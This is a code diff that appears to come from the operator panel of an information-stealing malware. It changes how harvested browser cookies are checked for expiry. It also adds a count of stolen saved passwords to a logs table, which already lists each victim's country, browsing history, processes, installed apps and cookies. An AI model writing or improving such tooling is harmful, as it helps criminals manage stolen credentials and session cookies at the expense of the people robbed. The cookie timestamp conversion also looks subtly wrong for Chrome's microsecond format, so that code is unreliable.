@@ -37,7 +37,7 @@ const isCookieNonExpired = (cookie) => {
         return true;
     }
     
-    // expires_utc is in microseconds since Windows epoch (1601-01-01)
+    // expires_utc is in Windows FILETIME format (100-nanosecond intervals since Windows epoch 1601-01-01)
     // Windows epoch to Unix epoch difference: 11644473600000 milliseconds
     const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
     
@@ -47,8 +47,8 @@ const isCookieNonExpired = (cookie) => {
     }
     
     try {
-        // Convert microseconds to milliseconds, then subtract epoch difference
-        const expiresMs = (cookie.expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
+        // Convert 100-nanosecond intervals to milliseconds, then subtract epoch difference
+        const expiresMs = (cookie.expires / 10000) - WINDOWS_EPOCH_DIFF_MS;
         const expiresDate = new Date(expiresMs);
         
         // Validate the date is reasonable
@@ -630,7 +630,7 @@ function LogsTable() {
                                         <TableCell sx={{ color: '#94a3b8' }}>{log.country}</TableCell>
                                         <TableCell sx={{ color: '#94a3b8' }}>{new Date(log.date).toLocaleString()}</TableCell>
                                         <TableCell sx={{ color: '#94a3b8' }}>
-                                            {`H:${log.dataSummary.historyEntries || 0}, P:${log.dataSummary.processes || 0}, A:${log.dataSummary.installedApps || 0}, C:${log.dataSummary.cookies || 0}`}
+                                            {`H:${log.dataSummary?.historyEntries || 0}, P:${log.dataSummary?.processes || 0}, A:${log.dataSummary?.installedApps || 0}, C:${log.dataSummary?.cookies || 0}, PWD:${log.dataSummary?.passwords || log.pcData?.savedPasswords?.length || 0}`}
                                         </TableCell>
                                         <TableCell>
                                             <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 0.5, maxWidth: '300px' }}>
